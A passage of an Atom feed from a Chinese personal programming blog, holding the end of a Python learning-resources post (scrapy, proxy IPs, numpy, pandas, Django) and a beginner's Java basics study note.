rel="noopener">Python的爬虫框架scrapy</a></li></ul><p>说实话，我用这个用的不怎么样，也没有好好学这个框架。不过这个框架确实是一个很优秀的框架，会让你有一个基本的项目思想。这个框架的学习的话直接看官方文档最好了，而且还有中文版的。 上述的东西可能就有点多了，但是慢慢来就行，视频的话可以倍速看，但是要边看边自己动手操作。第二本书可以翻阅，根据自己的弱项专门看就行。第三个项目文档可以作为检阅的工具，需要的时候差一下就行。 <strong>几个练手的项目</strong></p><ul><li><p>80s.tw, 经常在上面下载电影，网站不复杂，可以练练手。</p></li><li><p>知乎, 这个其实有点复杂，中间有些东西需要自己摸索，这样可以快速成长。</p></li></ul><p>有些网站我也记不清了，不过我还真没像很多文章一样就知道爬妹子图，0.0，爬虫技术的增加，就是在不断的挑战反爬虫机制。所以进阶的话，就不断地去做，大量的对单个网页，一个域名下的所有网站，挑战设置了很多反爬虫策略的网站。 对、还有一个资源是ip池，也可以自己爬，但是感觉用的效果一般。推荐一个卖ip的地方。</p><ul><li><a href="http://www.daxiangdaili.com/" target="_blank" rel="noopener">大象大理IP</a>, 推荐计数版的，5块钱20000个ip。可以用半年。</li></ul><h2 id="数据科学领域"><a href="#数据科学领域" class="headerlink" title="数据科学领域"></a>数据科学领域</h2><p>目前其实个人在这方面没有深究，主要是一些简单的库使用。只推荐自己使用过的。</p><ul><li><p>numpy， Python自身没有数组的，在Python中用列表的概念，numpy提供了这个，而且，有很多向量化的操作在神经网络的搭建中被大量使用。</p></li><li><p>pandas， 我基本上就是用它来处理表格数据，使用的时候也很强大，面对上百万条数据也不虚，前提是你不要使用循环遍历DataFrame。它的操作有点像并行操作。我目前就用它来做数据预处理的工作。</p></li><li><p><a href="http://sklearn.apachecn.org/cn/0.19.0/index.html" target="_blank" rel="noopener">scikit-learn</a>， 数据挖掘和数据分析工具，提供了很多算法的函数。提供中文文档，用的时候查文档就行了，不用单独学习。</p></li><li><p>SciPy， 这个我没怎么用个，也是我下一阶段要学习的库。</p></li><li><p>matplotlib， 数据科学怎么能少得了数据可视化，用这个库就可以直接作图看结果了，还是可以的。现在不是也有一个叫做数据可视化过程嘛，就是把神经网络的学习过程用可视化表现出来。感觉很酷。</p></li></ul><p>暂时就这么多吧，这个我没怎么利用教程，主要看文档吧，前两个和第三个我有电子书。scikitlearn用官方文档就行。优先学习前两个库，numpy和pandas。</p><h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><p>先说学习资源吧、</p><ul><li><a href="https://www.liaoxuefeng.com/wiki/0014316089557264a6b348958f449949df42a6d3a2e542c000/001432170876125c96f6cc10717484baea0c6da9bee2be4000#0" target="_blank" rel="noopener">廖雪峰的网站</a></li></ul><p>在廖雪峰的网站Python章节中的最后一节有一个web开发实战。这个实战的难度相对来说还是比较大的，要从头自己写框架、写orm、写MVC等等。这些知识需要Python前面的知识学的很扎实才能很好的完成。 除了自己写这些框架之外，还可以使用Python的两个流行框架django和flask，使用框架相较于前面的从头自己做少写了很多代码。flask没用过，就不说了。</p><ul><li><a href="http://www.liujiangblog.com/course/django/108" target="_blank" rel="noopener">刘江的博客及教程</a></li></ul><p>django的两个博客之一，可以查阅一下整个流程。有一些内容是不需要的，就没必要去做了，比如自动化部署等部分的内容。</p><ul><li><a href="https://docs.djangoproject.com/en/2.0/" target="_blank" rel="noopener">Django documentation</a></li></ul><p>Django2.0的官方文档，很全，很细致，需要英语水平差不多。还有很多bug的解决方法在其<a href="https://code.djangoproject.com/" target="_blank" rel="noopener">官网code</a>都能找到解决办法。 emmm、用框架不可耻。不过我们需要能在现有框架的基础上达到能自己拿到框架源码，根据自己的需求等去修改、完善这个框架才是正解。 其实web开发需要的知识面不仅仅涉及到后端，同样的前端和后端的结合也是一个很重要的问题，即前后端数据的传递，前端页面的设计，对于我们不是专门做UI设计的来说，前端页面在网上找一找模板就行，比如bootstrap模板等。 同时Python web开发的一整个框架如下图所示，搞懂了这个web框架也就理清了怎么开始开发web的这个问题了。</p><ul><li><img src="http://bhsy.getyo.cn/static/image2/others/Python开发体系.jpg" alt></li></ul><p>哦、我还有Django开发的一本电子书。 待更。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;按照Python的几个应用点来总结的。&lt;/p&gt;
&lt;h2 id=&quot;基础语法&quot;&gt;&lt;a href=&quot;#基础语法&quot; class=&quot;headerlink&quot; title=&quot;基础语法&quot;&gt;&lt;/a&gt;基础语法&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://www.liaoxuef
      
    
    </summary>
    
      <category term="python" scheme="http://yoursite.com/categories/python/"/>
    
    
      <category term="python" scheme="http://yoursite.com/tags/python/"/>
    
  </entry>
  
  <entry>
    <title>Java基础知识学习笔记（持续更新）</title>
    <link href="http://yoursite.com/2018/01/20/Java-learning-note/"/>
    <id>http://yoursite.com/2018/01/20/Java-learning-note/</id>
    <published>2018-01-19T16:00:00.000Z</published>
    <updated>2019-11-02T12:24:00.006Z</updated>
    
    <content type="html"><![CDATA[<p><strong>Java的数据结构</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">Collection</span><br><span class="line">├List</span><br><span class="line">│├LinkedList</span><br><span class="line">│├ArrayList</span><br><span class="line">│└Vector</span><br><span class="line">│　└Stack</span><br><span class="line">└Set</span><br><span class="line"></span><br><span class="line">Map</span><br><span class="line">├Hashtable</span><br><span class="line">├HashMap</span><br><span class="line">└WeakHashMap</span><br></pre></td></tr></table></figure><p><strong>Java标识符</strong></p><p><strong>访问控制修饰符 :</strong></p><ul><li>default： (即缺省，什么也不写）: 在同一包内可见，不使用任何修饰符。使用对象：类、接口、变量、方法。</li><li>public ：公共的</li><li>protected：受保护的</li><li>private：私有的</li></ul><p><strong>非访问控制修饰符 :</strong> </p><ul><li>final：用来修饰类、方法和变量，final 修饰的类不能够被继承，修饰的方法不能被继承类重新定义，修饰的变量为常量，是不可修改的。也就是不管修饰什么，结果都是不能进行修改。</li><li>abstract：用来创建抽象类和抽象方法</li><li>static：用来创建类方法和类变量</li><li>synchronized和 volatile 修饰符，主要用于线程的编程，synchronized是线程同步的意思：</li></ul><p><strong>StringBuilder和StringBuffer的区别</strong></p><ul><li>由于 StringBuilder 相较于 StringBuffer 有速度优势，所以多数情况下建议使用 StringBuilder 类。然而在应用程序要求线程安全的情况下，则必须使用 StringBuffer 类。</li></ul><p><strong>构造方法</strong></p><ul><li>使用构造方法来初始化创建的对象，构造方法没有返回值。</li><li>通常会使用构造方法给一个类的实例变量赋初值，或者执行其它必要的步骤来创建一个完整的对象。</li><li>相当于Python里面的类初始化函数<strong>init</strong>()</li></ul><p><strong>super和this关键字</strong></p><ul><li>super 是调用父类的方法，我们可以通过super关键字来实现对父类成员的访问，用来引用当前对象的父类。</li><li>this是调用子类的方法</li></ul><p><strong>继承的特性</strong></p><ul><li><p>子类拥有父类非 private 的属性、方法。</p></li><li><p>子类可以拥有自己的属性和方法，即子类可以对父类进行扩展。</p></li><li>子类可以用自己的方式实现父类的方法。</li><li>Java 的继承是单继承，但是可以多重继承，单继承就是一个子类只能继承一个父类，多重继承就是，例如 A 类继承 B 类，B 类继承 C 类，所以按照关系就是 C 类是 B 类的父类，B 类是 A 类的父类，这是 Java 继承区别于 C++ 继承的一个特性。</li><li>提高了类之间的耦合性（继承的缺点，耦合度高就会造成代码之间的联系越紧密，代码独立性越差）。</li><li>子类不继承父类的构造器，只调用</li></ul><p><strong>多态与overload、override</strong><br>…</p><p><strong>java的输入</strong></p><ul><li>从控制台输入：java.util.Scanner类</li><li>从文件输入：Java.io </li></ul><p><strong>Overriding和Overloading的总结</strong></p><p>方法的重写(Overriding)和重载(Overloading)是java多态性的不同表现，重写是父类与子类之间多态性的一种表现，重载可以理解成多态的具体表现形式。</p><ul><li>方法重载是一个类中定义了多个方法名相同,而他们的参数的数量不同或数量相同而类型和次序不同,则称为方法的重载(Overloading)。</li><li>方法重写是在子类存在方法与父类的方法的名字相同,而且参数的个数与类型一样,返回值也一样的方法,就称为重写(Overriding)。</li><li>方法重载是一个类的多态性表现,而方法重写是子类与父类的一种多态性表现。</li></ul><p><strong>java封装</strong></p><p>保证代码的安全性，比如代码中的数据通过getter或者setter进行确定。以确保减少代码漏洞。</p><p><strong>java IO</strong></p><p><img src="/images/article/clipboard.png" alt></p><p><strong>Java中遍历Map对象的4种方法</strong><br>CSDN上有收藏</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;strong&gt;Java的数据结构&lt;/strong&gt;&lt;/p&gt;
&lt;figure class=&quot;highlight java&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span cla
      
    
    </summary>
    
      <category term="Java" scheme="http://yoursite.com/categories/Java/"/>
    
    
      <category term="Java" scheme="http://yoursite.com/tags/Java/"/>
    
  </entry>
  
</feed>
